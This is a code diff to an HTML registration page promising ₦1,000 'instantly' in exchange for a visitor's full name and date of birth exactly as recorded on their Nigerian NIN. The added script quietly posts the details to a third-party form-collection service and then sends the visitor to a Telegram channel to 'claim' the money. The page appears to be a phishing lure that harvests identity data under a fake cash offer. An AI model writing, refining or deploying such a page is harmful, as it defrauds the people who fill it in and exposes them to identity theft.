@@ -45,11 +45,11 @@
       border: 1px solid #ccc;
       border-radius: 6px;
       font-size: 16px;
-      color: #000; /* Dark black text */
+      color: #000;
     }
 
     input[type="date"] {
-      font-weight: bold; /* Bold for date of birth */
+      font-weight: bold;
     }
 
     button {
@@ -75,6 +75,22 @@
       margin-top: 20px;
     }
 
+    .success-message {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .success-message a {
+      color: #27ae60;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .success-message a:hover {
+      text-decoration: underline;
+    }
+
     @media screen and (max-width: 480px) {
       .container {
         padding: 20px;
@@ -85,16 +101,48 @@
 <body>
   <div class="container">
     <h2>Register & Win ₦1,000</h2>
-    <p>Fill in the details below to receive ₦1,000 instantly!</p>
-    <p>Your Name and Date of Birth As it is on your NIN</p>
-    <p>Offer Available to people between the ages of 18 and above</p>
-    <form action="https://formspree.io/f/xvgalvqo" method="POST">
+    <h2>Note this: Register with your Full name and Date Of Birth As it is on your NIN</h2>
+    <p>Fill in the details to receive ₦1,000 instantly!</p>
+    <p>This offer is not for anyone below the age of 18 years</p>
+    <form action="https://formspree.io/f/xvgalvqo" method="POST" id="regForm">
       <input type="text" name="fullname" placeholder="Full Name (as on NIN)" required />
-      <input type="date" name="dob" placeholder="Date Of Birth (as on NIN)" required />
-      <input type="hidden" name="_redirect" value="https://t.me/OfferForYou2025">
+      <input type="date" name="dob" required />
       <button type="submit">Claim ₦1,000</button>
     </form>
+
+    <div class="success-message" id="successMessage">
+      <p>Thank you for registering!</p>
+      <p><a href="https://t.me/OfferForYou2025" target="_blank">Click here to receive your ₦1,000 offer</a></p>
+    </div>
+
     <div class="footer">Powered by OfferForYou2025</div>
   </div>
+
+  <script>
+    const form = document.getElementById('regForm');
+    const successMessage = document.getElementById('successMessage');
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          form.style.display = 'none';
+          successMessage.style.display = 'block';
+        } else {
+          alert("There was a problem submitting the form.");
+        }
+      }).catch(error => {
+        alert("Something went wrong. Please try again later.");
+      });
+    });
+  </script>
 </body>
 </html>
